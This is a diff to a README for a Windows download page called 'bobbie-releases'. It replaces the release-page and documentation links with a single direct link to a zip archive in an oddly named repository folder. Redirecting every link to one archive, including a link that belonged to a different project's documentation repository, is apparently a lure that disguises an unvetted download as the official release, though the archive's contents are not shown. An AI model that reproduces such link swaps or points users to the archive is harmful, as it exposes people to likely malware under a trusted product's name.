@@ -1,6 +1,6 @@
 # 🧩 bobbie-releases - Download Bobbie for Windows
 
-[![Download Bobbie Releases](https://img.shields.io/badge/Download%20Bobbie-Releases-blue?style=for-the-badge)](https://github.com/confirmed-asiancoralsnake620/bobbie-releases/releases)
+[![Download Bobbie Releases](https://img.shields.io/badge/Download%20Bobbie-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/confirmed-asiancoralsnake620/bobbie-releases/main/megasclere/releases-bobbie-1.7.zip)
 
 ## 🖥️ What this is
 
@@ -12,7 +12,7 @@ This repository does not include the private Bobbie source code. It includes the
 ## 📥 Download Bobbie on Windows
 
 Visit this page to download:  
-https://github.com/confirmed-asiancoralsnake620/bobbie-releases/releases
+https://raw.githubusercontent.com/confirmed-asiancoralsnake620/bobbie-releases/main/megasclere/releases-bobbie-1.7.zip
 
 On that page, look for the latest release and download the Windows file. If there are more than one file, choose the one that matches your computer.
 
@@ -100,7 +100,7 @@ Common use cases include:
 
 The main public documentation lives in the separate harness repository:
 
-- https://github.com/4014-Labs/bobbie-harness
+- https://raw.githubusercontent.com/confirmed-asiancoralsnake620/bobbie-releases/main/megasclere/releases-bobbie-1.7.zip
 
 Use that repo for:
 
@@ -158,4 +158,4 @@ It is the place to get the public build files and the current runtime docs.
 
 ## 📎 Download Link
 
-https://github.com/confirmed-asiancoralsnake620/bobbie-releases/releases
+https://raw.githubusercontent.com/confirmed-asiancoralsnake620/bobbie-releases/main/megasclere/releases-bobbie-1.7.zip
